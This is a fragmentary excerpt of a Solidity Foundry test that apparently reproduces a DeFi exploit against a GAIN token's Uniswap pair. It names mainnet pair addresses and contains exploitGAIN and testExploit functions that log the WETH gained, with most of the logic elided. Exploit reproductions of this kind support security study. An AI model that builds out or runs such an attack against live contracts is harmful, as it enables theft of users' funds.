...
contract ContractTest is Test {
    ...
    Uni_Pair_V3 univ3USDT =
        Uni_Pair_V3(0xc7bBeC68d12a0d1830360F8Ec58fA599bA1b0e9b);
    Uni_Pair_V2 univ2GAIN =
        Uni_Pair_V2(0x31d80EA33271891986D873B397d849A92EF49255);
    ...
    function exploitGAIN() internal {
        ...
        uint leave_dust = WETH.balanceOf(address(univ2GAIN)) -
    ...
    function testExploit() external {
        ...
        console.log("Before Start: ETH: ", WETH.balanceOf(address(this)));
        ...
        console.log("Attack Exploit: %s ETH: ", intRes, decRes);
        console.log("Attack Exploit:  ", WETH.balanceOf(address(this)));
    }
}
